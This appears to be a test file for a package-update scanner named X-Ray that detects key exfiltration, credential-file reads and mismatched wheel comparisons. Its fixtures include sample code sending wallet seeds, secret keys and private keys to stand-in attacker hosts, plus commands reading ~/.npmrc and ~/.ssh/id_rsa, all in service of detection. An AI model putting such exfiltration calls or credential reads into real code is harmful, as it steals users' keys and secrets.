// Three gaps found by comparing X-Ray with a general coding agent on the same updates: keys sent to a
// new hard-coded address were only a low "new host" (xrpl 4.2.1, @solana/web3.js 1.95.7); an
// environment's own .npmrc in shell activation templates was a high credential read (nodeenv 1.11.0);
// and each version's best wheel was picked on its own, so a cp315 wheel was compared with a cp314 one.
import test from 'node:test';
import assert from 'node:assert/strict';
import { npmSnapshot } from '../src/snapshot.js';
import { diffSnapshots } from '../src/diff.js';
import { scanJs } from '../src/js-scan.js';
import { scanString } from '../src/signals.js';
import { pypiPickArtifacts } from '../src/registry.js';

const pkg = Buffer.from(JSON.stringify({ name: 't', version: '1.0.0', main: 'index.js' }));
const files = (entries) => new Map([['package.json', pkg], ...entries.map(([p, s]) => [p, Buffer.from(s)])]);
const diff = async (before, after) => diffSnapshots(await npmSnapshot(files(before)), await npmSnapshot(files(after)));
const keyExfil = (src) => scanJs(src).signals.filter((s) => s.kind === 'key-exfil').map((s) => s.detail);
const credential = (s) => { const out = []; scanString(s, (k, d) => { if (k === 'credential-path') out.push(d); }); return out; };

test('a fetch that sends a seed to a new hard-coded host is high, in a file that already used fetch', async () => {
    const before = 'export function wallet(algorithm) {\n  const seed = gen(algorithm);\n  return fetch(this.url, { method: "POST" }).then(() => seed);\n}\n';
    const after = 'export function wallet(algorithm) {\n  const seed = gen(algorithm);\n  fetch("https://0x9c.example-bad.xyz/xc", {\n    method: "POST",\n    headers: { "ad-referral": seed },\n  });\n  return fetch(this.url, { method: "POST" }).then(() => seed);\n}\n';
    const r = await diff([['index.js', before]], [['index.js', after]]);
    const f = r.findings.filter((x) => x.kind === 'key-exfil');
    assert.equal(f.length, 1, JSON.stringify(r.findings));
    assert.equal(f[0].severity, 'high');
    assert.equal(f[0].detail, 'fetch() sends seed to 0x9c.example-bad.xyz');
    assert.deepEqual(f[0].locations, [{ file: 'index.js', line: 3 }]);
    assert.equal(r.verdict, 'review');
});

test('a secret key passed to the function that holds the request is high, named with that function', () => {
    const src = `class Loader {
  static addToQueue(process) {
    const b = encode(process);
    fetch("https://rpc.example-bad.xyz/api/queue", { method: "POST", headers: { "x-session-id": b } }).catch(() => {});
  }
}
class Keypair {
  constructor(secretKey) { this._secretKey = secretKey; Loader.addToQueue(this._secretKey); }
  static fromSecretKey(secretKey) { Loader.addToQueue(secretKey); return new Keypair(secretKey); }
}
`;
    // One finding per sending function, naming the first key passed to it.
    assert.deepEqual(keyExfil(src), ['fetch() sends _secretKey to rpc.example-bad.xyz through addToQueue()']);
    assert.ok(scanJs(src).signals.filter((s) => s.kind === 'key-exfil').every((s) => s.line === 4));
});

test('other request calls and template URLs count too', () => {
    assert.deepEqual(keyExfil('axios.post(`https://collect.example-bad.top/${id}`, { mnemonic });'), ['post() sends mnemonic to collect.example-bad.top']);
    assert.deepEqual(keyExfil('$.ajax("https://k.example-bad.top/", { data: { k: wallet.privateKey } });'), ['ajax() sends privateKey to k.example-bad.top']);
});

test('padding or deep nesting in the request does not hide the key', () => {
    const pad = Array.from({ length: 5000 }, (_, i) => `a${i}: ${i}`).join(', ');
    assert.deepEqual(keyExfil(`fetch("https://k.example-bad.top/", { body: JSON.stringify({ ${pad}, k: seed }) });`), ['fetch() sends seed to k.example-bad.top']);
    assert.deepEqual(keyExfil(`fetch("https://k.example-bad.top/", ${'['.repeat(500)}seed${']'.repeat(500)});`), ['fetch() sends seed to k.example-bad.top']);
    assert.deepEqual(keyExfil(`function s(p) { fetch("https://k.example-bad.top/", { body: p }); }\ns(${'['.repeat(500)}privateKey${']'.repeat(500)});`), ['fetch() sends privateKey to k.example-bad.top through s()']);
});

test('many key names and calls are worked out in linear time', () => {
    const n = 20000;
    const src = `function s(p) { fetch("https://k.example-bad.top/", { body: p }); }\n` + Array.from({ length: n }, (_, i) => `s([seed, ${i}], f(g(h(privateKey))));`).join('\n')
        + `\nfetch("https://k.example-bad.top/", [${Array.from({ length: n }, () => 'seed').join(', ')}]);\n`;
    const t = Date.now();
    assert.deepEqual(keyExfil(src).sort(), ['fetch() sends seed to k.example-bad.top', 'fetch() sends seed to k.example-bad.top through s()']);
    assert.ok(Date.now() - t < 3000, `${Date.now() - t} ms`);
});

test('no key-exfil without a hard-coded new host, without key material, or for an object key only', () => {
    for (const src of [
        'fetch(this.baseUrl + "/x", { body: JSON.stringify({ seed }) });', // address not hard-coded
        'fetch(`${base}/x`, { body: seed });', // template that starts with a value
        'fetch("https://api.example-svc.dev/v1", { body: JSON.stringify({ apiKey }) });', // not key material
        'fetch("https://api.example-svc.dev/v1", { body: JSON.stringify({ seed: 1 }) });', // only an object key
        'fetch("https://github.com/x", { body: seed });', // well-known site
        'fetch("https://api.example-svc.dev/v1").then(() => use(seed));', // read in a callback, not sent
        'request("https://api.example-svc.dev/v1", (err, res) => store(seed, res));', // callback argument, not sent
        'function send() { fetch("https://api.example-svc.dev/v1"); }\nsend(config);', // sender called without a key
        'console.log("https://api.example-svc.dev/v1", seed);', // not a request
    ]) assert.deepEqual(keyExfil(src), [], src);
});

test('the same request in both versions is not new', async () => {
    const src = 'export function f(seed) { fetch("https://k.example-bad.top/", { body: seed }); }\n';
    const r = await diff([['index.js', src]], [['index.js', `${src}export const x = 1;\n`]]);
    assert.deepEqual(r.findings.filter((x) => x.kind === 'key-exfil'), []);
});

test('an .npmrc under a non-home variable directory is config; under home it is still a credential read', () => {
    for (const s of [
        'npm_config_userconfig="$NODE_VIRTUAL_ENV/.npmrc"',
        'set -gx npm_config_userconfig "${NODE_VIRTUAL_ENV}/.npmrc"',
        "export npm_config_userconfig='__NODE_VIRTUAL_ENV__/.npmrc'",
        '%PREFIX%\\.pypirc',
    ]) assert.deepEqual(credential(s), [], s);
    for (const [s, want] of [
        ['cat $HOME/.npmrc', '/.npmrc'],
        ['cat ${HOME}/.npmrc', '/.npmrc'],
        ['cat $HOME_DIR/.npmrc', '/.npmrc'],
        ['__HOME__/.npmrc', '/.npmrc'],
        ['type %USERPROFILE%\\.npmrc', '\\.npmrc'],
        ['~/.npmrc', '/.npmrc'],
        ['.npmrc', '.npmrc'],
        // an environment's own config does not hide a home read later in the same string
        ['cp $VENV/.npmrc /tmp; cat ~/.npmrc', '/.npmrc'],
        ['cp $VENV/.npmrc /tmp; cat ~/.ssh/id_rsa', '.ssh/id_'],
    ]) assert.deepEqual(credential(s), [want], s);
});

test('environment-config matches are checked up to a cap; past it the next one counts, quickly', () => {
    assert.deepEqual(credential('$VENV/.npmrc '.repeat(50)), []);
    const s = '$VENV/.npmrc '.repeat(1500);
    const t = Date.now();
    assert.deepEqual(credential(s), ['/.npmrc']);
    assert.ok(Date.now() - t < 200, `${Date.now() - t} ms`);
});

const wheel = (filename) => ({ filename, packagetype: 'bdist_wheel' });
const sdist = (filename) => ({ filename, packagetype: 'sdist' });

test('wheels are compared on a tag both versions publish, not on each version\'s newest Python', () => {
    const tag = (v, py, plat) => wheel(`orjson-${v}-${py}-${py}-${plat}.whl`);
    const m17 = 'manylinux_2_17_x86_64.manylinux2014_x86_64';
    const from = ['cp312', 'cp313', 'cp314'].map((py) => tag('3.11.9', py, m17)).concat(sdist('orjson-3.11.9.tar.gz'));
    const to = ['cp312', 'cp313', 'cp314'].map((py) => tag('3.12.0', py, m17)).concat(tag('3.12.0', 'cp315', 'manylinux_2_39_x86_64'), sdist('orjson-3.12.0.tar.gz'));
    const pairs = pypiPickArtifacts(from, to);
    assert.deepEqual(pairs.map((p) => [p.kind, p.from.filename, p.to.filename]), [
        ['wheel', `orjson-3.11.9-cp314-cp314-${m17}.whl`, `orjson-3.12.0-cp314-cp314-${m17}.whl`],
        ['sdist', 'orjson-3.11.9.tar.gz', 'orjson-3.12.0.tar.gz'],
    ]);
});

test('with no shared wheel tag, each version\'s best wheel is still compared', () => {
    const pairs = pypiPickArtifacts([wheel('x-1.0-py2-none-any.whl')], [wheel('x-2.0-py3-none-any.whl')]);
    assert.deepEqual(pairs.map((p) => [p.from.filename, p.to.filename]), [['x-1.0-py2-none-any.whl', 'x-2.0-py3-none-any.whl']]);
    const added = pypiPickArtifacts([], [wheel('x-2.0-py3-none-any.whl')]);
    assert.deepEqual(added.map((p) => [p.from, p.to.filename]), [[null, 'x-2.0-py3-none-any.whl']]);
});
